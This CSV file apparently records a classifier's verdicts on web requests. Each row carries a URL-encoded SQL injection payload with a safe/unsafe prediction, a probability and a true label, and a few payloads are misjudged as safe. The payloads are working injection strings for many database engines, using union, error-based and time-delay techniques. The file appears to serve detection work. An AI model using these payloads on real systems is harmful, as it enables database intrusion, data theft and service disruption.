request_id,url,payload,classification,probability,label
b461b56f,,1%27%20in%20boolean%20mode%29%20and%205725%3D5552%23,unsafe,1.0,1
db27726f,,1%29%20as%20duqb%20where%206495%3D6495%3Bselect%20%28case%20when%20%285914%3D2314%29%20then%205914%20else%201/%28select%200%29%20end%29--,unsafe,1.0,1
0a873b55,,1%29%20as%20biup%20where%201414%3D1414%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
24385510,,1%22%29%20and%204241%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%284241%3D4241%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%28%22hbfr%22%20like%20%22hbfr,unsafe,1.0,1
2979bfde,,1%27%29%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%27ejnt%27%20like%20%27ejnt,unsafe,1.0,1
9e9d75b0,,1%22%29%29%20union%20all%20select%20null--,unsafe,1.0,1
cad3e7d1,,1%29%20where%201096%3D1096%3Bif%287899%3D7899%29%20select%207899%20else%20drop%20function%20zbbp--,unsafe,1.0,1
0fc0d895,,1%29%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%285215%3D5215,unsafe,1.0,1
526aac18,,1%29%20and%206055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%286055%3D6055%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%282868%3D2868,unsafe,1.0,1
c727ec11,,1%27%2C%28cast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%287823%3D7823%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%29,safe,0.4604018373076511,1
52caf897,,1%22%29%29%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%28%22vhey%22%3D%22vhey,unsafe,1.0,1
0b7f057c,,1%27%2B%28select%20echl%20where%206593%3D6593%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29vwyq%29%23,unsafe,1.0,1
dd4cf953,,1%27%7C%7C%28select%20%27glyc%27%20from%20dual%20where%204058%3D4058%3B%28select%20%2A%20from%20%28select%28sleep%285%29%29%29srmq%29%29%7C%7C%27,unsafe,1.0,1
c5a0d84e,,-1305%29%20or%20make_set%282298%3D5545%2C5545%29%20and%20%286715%3D6715,unsafe,1.0,1
9d2b725b,,1%25%22%29%29%20union%20all%20select%20null%2Cnull%2Cnull--,unsafe,1.0,1
2ca5c8ac,,1%27%3Bbegin%20user_lock.sleep%285%29%3B%20end%20and%20%27huti%27%20like%20%27huti,unsafe,1.0,1
a9116f7a,,1%27%29%29%29%20and%209660%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,1.0,1
c831afcd,,1%27%29%29%29%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%28%28%27toft%27%3D%27toft,unsafe,1.0,1
f239d179,,1%22%29%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%28%28%22swec%22%20like%20%22swec,unsafe,1.0,1
76766620,,1%25%27%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%27%25%27%3D%27,unsafe,1.0,1
32f95835,,1%27%7C%7C%28select%20%27gbyh%27%20from%20dual%20where%205889%3D5889%20order%20by%201%23,unsafe,1.0,1
1930f6f4,,1%22%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%22rbqs%22%3D%22rbqs,unsafe,1.0,1
ec7b7948,,-7552%20or%206872%3D6872,unsafe,1.0,1
de3619b8,,-6353%25%27%29%29%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr,unsafe,1.0,1
b8e64443,,-5438%22%29%20union%20all%20select%203170%2C3170--,unsafe,1.0,1
f5558270,,1%22%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%22menm%22%20like%20%22menm,unsafe,1.0,1
43882eff,,1%22%29%29%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%28%28%28%22woun%22%20like%20%22woun,unsafe,1.0,1
f3b5b5ba,,-8486%25%27%29%29%29%20or%208571%3D8571--,unsafe,1.0,1
73454d33,,1%29%29%20as%20khvx%20where%207533%3D7533%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
6cfbdec5,,-6155%25%27%29%29%20union%20all%20select%202421%2C2421%2C2421%2C2421%2C2421%23,unsafe,1.0,1
75b6f395,,1%22%29%29%29%3Bselect%20pg_sleep%285%29%20and%20%28%28%28%22wqeb%22%3D%22wqeb,unsafe,1.0,1
d1f6c013,,-2872%29%20where%208797%3D8797%20or%201%20group%20by%20concat%280x7171706a71%2C%28select%20%28case%20when%20%284232%3D4232%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29%20having%20min%280%29%23,unsafe,1.0,1
59dd0290,,-7741%27%29%20where%208271%3D8271%20union%20all%20select%208271%2C8271%2C8271%2C8271%2C8271%2C8271%2C8271%23,unsafe,1.0,1
a3d00579,,1%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--%20ygbf,unsafe,1.0,1
990e1fcc,,%28select%20%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283287%3D3287%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29,safe,0.4588295903357384,1
544ea6f0,,1%2C%28select%20%28case%20when%20%289644%3D9644%29%20then%20dbms_pipe.receive_message%28chr%2875%29%7C%7Cchr%2878%29%7C%7Cchr%28104%29%7C%7Cchr%2898%29%2C5%29%20else%201/%28select%200%20from%20dual%29%20end%29%20from%20dual%29,unsafe,1.0,1
3b6205a2,,-2216%22%29%20where%206692%3D6692%20union%20all%20select%206692%2C6692%2C6692%23,unsafe,1.0,1
512317d2,,-4135%27%29%29%29%20union%20all%20select%204413%2C4413%2C4413%23,unsafe,1.0,1
5720fa54,,1%25%27%20union%20all%20select%20null%2Cnull%2Cnull%23,unsafe,1.0,1
a6981829,,1%25%27%29%29%29%20union%20all%20select%20null%2Cnull--,unsafe,1.0,1
09101fdf,,-6279%27%29%20union%20all%20select%203026%2C3026%2C3026%2C3026%2C3026%2C3026%2C3026%2C3026--,unsafe,1.0,1
6ac87394,,1%20and%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29fzno%29--%20ybmz,unsafe,1.0,1
bda9b9d2,,1%29%20and%203824%3Dbenchmark%285000000%2Cmd5%280x76555642%29%29%20and%20%286786%3D6786,unsafe,1.0,1
8adfc4e6,,-2291%29%29%20or%204067%3D5666%23,unsafe,1.0,1
ecfef58d,,1%22%20where%209669%3D9669%3Bselect%20sleep%285%29--,unsafe,1.0,1
754f2ff4,,1%22%29%29%20as%20xtlt%20where%209293%3D9293%3Bselect%20case%20when%207717%3D7717%20then%201%20else%20null%20end--,unsafe,1.0,1
c0686ab8,,1%22%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,unsafe,1.0,1
0aaec876,,1%29%20where%202678%3D2678%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,1.0,1
e198ab69,,1%27%29%20where%206672%3D6672%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
42ab24b4,,1%27%7C%7C%28select%20%27yhkt%27%20from%20dual%20where%207105%3D7105%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29%29%7C%7C%27,unsafe,1.0,1
9f022c86,,1%27%2B%28select%20%27vtyw%27%20where%207950%3D7950%20order%20by%201--,unsafe,1.0,1
c828f3ba,,1%22%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
36e85521,,1%27%20in%20boolean%20mode%29%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%23,unsafe,1.0,1
118b450e,,1%25%22%29%29%20or%20elt%286272%3D6272%2Csleep%285%29%29%20and%20%28%28%22%25%22%3D%22,unsafe,1.0,1
5f1356d2,,1%22%29%20procedure%20analyse%28extractvalue%289255%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x52515a50%29%29%29%29%29%2C1%29%20and%20%28%22smhd%22%20like%20%22smhd,unsafe,1.0,1
637836e1,,1%25%27%20or%20elt%285873%3D5873%2Csleep%285%29%29%23,unsafe,1.0,1
3cfc0168,,1%22%20and%20elt%281210%3D1210%2Csleep%285%29%29%20and%20%22phcl%22%20like%20%22phcl,unsafe,1.0,1
66e6fe66,,1%27%20or%208466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29%20and%20%27raru%27%3D%27raru,unsafe,1.0,1
323dae73,,1%27%2B%28select%20%27kcix%27%20where%201117%3D1117%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,unsafe,1.0,1
506e4599,,1%20or%205356%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,unsafe,1.0,1
f5ac2b7b,,-4785%27%20or%20%288459%3D8459%29%2A4906%20and%20%27esfn%27%3D%27esfn,unsafe,1.0,1
cb37eb7e,,-1238%27%29%20as%20lxur%20where%207075%3D7075%20union%20all%20select%207075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%2C7075%23,unsafe,1.0,1
3751590a,,1%29%20where%207978%3D7978%20or%207427%3Ddbms_pipe.receive_message%28chr%28116%29%7C%7Cchr%2887%29%7C%7Cchr%2890%29%7C%7Cchr%28109%29%2C5%29--,unsafe,1.0,1
e37040e4,,1%27%29%29%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual%20and%20%28%28%27cgou%27%20like%20%27cgou,unsafe,1.0,1
283e367f,,1%29%29%29%20and%20row%286237%2C7469%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%286237%3D6237%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%29a%20group%20by%20x%29%20and%20%28%28%284127%3D4127,unsafe,1.0,1
dd33d070,,1%22%29%29%20rlike%20%28select%20%28case%20when%20%288179%3D1246%29%20then%201%20else%200x28%20end%29%29%20and%20%28%28%22xxeu%22%3D%22xxeu,unsafe,1.0,1
64eabeeb,,1%22%29%29%20and%206414%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%28%28%22kldp%22%20like%20%22kldp,unsafe,1.0,1
98971eac,,1%25%27%29%29%3Bselect%20%28case%20when%20%286276%3D6276%29%20then%206276%20else%206276%2A%28select%206276%20from%20information_schema.character_sets%29%20end%29%23,unsafe,1.0,1
762c9a24,,-1874%22%29%20as%20wgpj%20where%206481%3D6481%20or%203629%3D3459,unsafe,1.0,1
35dddca2,,1%27%29%29%20as%20yyud%20where%204934%3D4934%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,unsafe,1.0,1
6c64f6ce,,-3130%29%20union%20all%20select%201741%2C1741%2C1741%2C1741%2C1741%2C1741%2C1741%2C1741%23,unsafe,1.0,1
907d0f19,,1%25%22%29%20and%20row%286237%2C7469%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%286237%3D6237%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%29a%20group%20by%20x%29%20and%20%28%22%25%22%3D%22,unsafe,1.0,1
0940d85b,,-1368%29%29%20union%20all%20select%201310%2C1310%2C1310%2C1310%2C1310%23,unsafe,1.0,1
7f23700b,,1%27%2C%28select%20%2A%20from%20generate_series%282636%2C2636%2Ccase%20when%20%282636%3D7071%29%20then%201%20else%200%20end%29%20limit%201%29,unsafe,1.0,1
ac3c8a7d,,1%29%29%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%288475%3D8475,unsafe,1.0,1
a33095d4,,1%25%27%20and%20%28select%209067%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289067%3D9067%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%27%25%27%3D%27,unsafe,1.0,1
1fd07a85,,1%25%27%29%20or%208421%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%27%25%27%3D%27,unsafe,1.0,1
691c0501,,-4873%27%29%29%29%20or%203038%3D3038,unsafe,1.0,1
c5b41b17,,1%27%20in%20boolean%20mode%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
9105e8d3,,-2722%22%29%20or%204907%3D8126%23,unsafe,1.0,1
fd4a9972,,1%27%29%29%29%20or%208466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29%20and%20%28%28%28%27sqzl%27%3D%27sqzl,unsafe,1.0,1
446eeed5,,-3461%22%29%29%20union%20all%20select%206342%2C6342%2C6342%2C6342%2C6342%2C6342%23,unsafe,1.0,1
b5a278e3,,1%20and%207756%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%287756%3D7756%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%23%20odvp,unsafe,1.0,1
7a2b2c09,,1%27%7C%7C%28select%20%27drna%27%20from%20dual%20where%205082%3D5082%20and%203824%3Dbenchmark%285000000%2Cmd5%280x76555642%29%29%29%7C%7C%27,unsafe,1.0,1
848af21a,,1%27%29%3Bselect%20%28case%20when%20%284297%3D9086%29%20then%204297%20else%201/%28select%200%29%20end%29--,safe,0.061472615057258886,1
c9c71ab1,,1%29%20where%201559%3D1559%20or%20updatexml%281808%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%281808%3D1808%2C1%29%29%29%2C0x717a767a71%29%2C8666%29--,unsafe,1.0,1
5468d2b2,,1%27%2B%28select%20%27swxi%27%20where%207651%3D7651%20and%206414%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%29%2B%27,unsafe,1.0,1
2ed84d42,,%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29,unsafe,1.0,1
dd9a9fe9,,-2364%27%20or%206743%3D7578,unsafe,1.0,1
4f3452fe,,1%27%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%27wjwn%27%3D%27wjwn,unsafe,1.0,1
41c28d7c,,1%22%29%29%20and%209800%3D8713,unsafe,1.0,1
97833ba9,,1%29%20as%20sdnd%20where%209472%3D9472%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual--,unsafe,1.0,1
5aa2ab71,,1%25%27%29%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%27%25%27%3D%27,unsafe,1.0,1
ab5387a3,,1%22%20where%203692%3D3692%20union%20all%20select%20null%2Cnull--,unsafe,1.0,1
30a77868,,1%22%29%29%20or%207427%3Ddbms_pipe.receive_message%28chr%28116%29%7C%7Cchr%2887%29%7C%7Cchr%2890%29%7C%7Cchr%28109%29%2C5%29--,unsafe,1.0,1
c960115f,,1%25%22%29%3Bwaitfor%20delay%20%270%3A0%3A5%27%20and%20%28%22%25%22%3D%22,unsafe,1.0,1
3e681073,,1%2C%28select%20%28case%20when%20%288382%3D8382%29%20then%201%20else%201/%28select%200%29%20end%29%29,safe,0.05713562873830105,1
343e92f8,,1%27%29%29%20as%20gqzy%20where%202312%3D2312%20or%205286%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,1.0,1
c5109509,,1%25%22%29%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,1.0,1
5cfb2907,,1%27%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%27zpyx%27%3D%27zpyx,unsafe,1.0,1
533cb3b5,,1%27%29%20and%206414%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%28%27zcey%27%3D%27zcey,unsafe,1.0,1
d594ed1d,,1%29%29%20as%20rvex%20where%203462%3D3462%20and%204595%3D4595%23,unsafe,1.0,1
1ce0f86d,,-2314%25%27%29%29%20union%20all%20select%204612%2C4612--,unsafe,1.0,1
f0676ed9,,1%22%29%29%29%3Bselect%20pg_sleep%285%29%20and%20%28%28%28%22nvuv%22%20like%20%22nvuv,unsafe,1.0,1
d9b5c4b2,,1%25%27%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20and%20%27%25%27%3D%27,unsafe,1.0,1
8fba8a41,,1%29%20or%204411%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29,unsafe,1.0,1
f2299ea7,,1%27%29%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29,unsafe,1.0,1
867a85c5,,1%25%22%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
4b6b2d68,,1%27%20and%20char%28111%29%7C%7Cchar%2877%29%7C%7Cchar%28121%29%7C%7Cchar%2888%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%27jjxn%27%3D%27jjxn,unsafe,1.0,1
deb7baa6,,1%27%29%20where%203636%3D3636%20or%204240%3D%28select%204240%20from%20pg_sleep%285%29%29--,unsafe,1.0,1
de220448,,-2429%25%27%20or%206890%3D5846,unsafe,1.0,1
93d5d275,,1%27%29%20where%209221%3D9221%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29--,unsafe,1.0,1
32a34ca1,,-6942%27%29%20union%20all%20select%207280%2C7280%2C7280%23,unsafe,1.0,1
84e920fa,,1%27%29%20and%202853%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%282853%3D2853%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20as%20numeric%29%20and%20%28%27hgwt%27%20like%20%27hgwt,unsafe,1.0,1
1a927a90,,1%29%20as%20uuro%20where%206784%3D6784%3Bif%287899%3D7899%29%20select%207899%20else%20drop%20function%20zbbp--,unsafe,1.0,1
5117b954,,-3362%27%20where%206567%3D6567%20or%201%20group%20by%20concat%280x7171706a71%2C%28select%20%28case%20when%20%284232%3D4232%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29%20having%20min%280%29%23,unsafe,1.0,1
5077d6c9,,1%27%29%29%20and%204242%3D5831%20and%20%28%28%27xflh%27%20like%20%27xflh,unsafe,1.0,1
08436969,,1%27%29%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27%20and%20%28%28%28%27hrta%27%3D%27hrta,unsafe,1.0,1
20e48593,,-5026%27%20or%20%288459%3D8459%29%2A4906%20and%20%27uavj%27%20like%20%27uavj,unsafe,1.0,1
f0d4bd81,,1%22%20rlike%20%28select%20%28case%20when%20%285552%3D1712%29%20then%201%20else%200x28%20end%29%29,safe,0.05082020841991222,1
a91cbcf2,,1%27%7C%7C%28select%20%27uvbb%27%20where%207795%3D7795%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%29%7C%7C%27,unsafe,1.0,1
8accab7b,,1%27%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,1.0,1
eb6bc5aa,,1%22%29%20as%20bksv%20where%205375%3D5375%3Bselect%20%28case%20when%20%284660%3D4660%29%20then%204660%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual--,unsafe,1.0,1
e23b6732,,1%27%29%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,unsafe,1.0,1
7354a748,,1%22%29%20where%201833%3D1833%3Bselect%20%28case%20when%20%283344%3D8103%29%20then%203344%20else%201/%28select%200%29%20end%29--,unsafe,1.0,1
adaf1a2a,,1%29%29%20and%202716%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,unsafe,1.0,1
eda1d2e4,,1%22%20where%209804%3D9804%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,unsafe,1.0,1
1f435d97,,1%27%7C%7C%28select%20%27fraa%27%20from%20dual%20where%209140%3D9140%20and%20row%286237%2C7469%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%286237%3D6237%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%29a%20group%20by%20x%29%29%7C%7C%27,unsafe,1.0,1
5c26a875,,1%22%20union%20all%20select%20null%2Cnull%2Cnull%23,unsafe,1.0,1
ea2d3476,,1%27%7C%7C%28select%20%27alxi%27%20where%203967%3D3967%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,unsafe,1.0,1
f495db11,,1%27%2B%28select%20%27xbyn%27%20where%206881%3D6881%3Bbegin%20user_lock.sleep%285%29%3B%20end%29%2B%27,unsafe,1.0,1
739b91d2,,1%27%20where%207014%3D7014%20or%208466%3Dbenchmark%285000000%2Cmd5%280x694a4745%29%29--,unsafe,1.0,1
2fcce549,,1%20where%208905%3D8905%20and%20make_set%287654%3D1923%2C1923%29--,unsafe,1.0,1
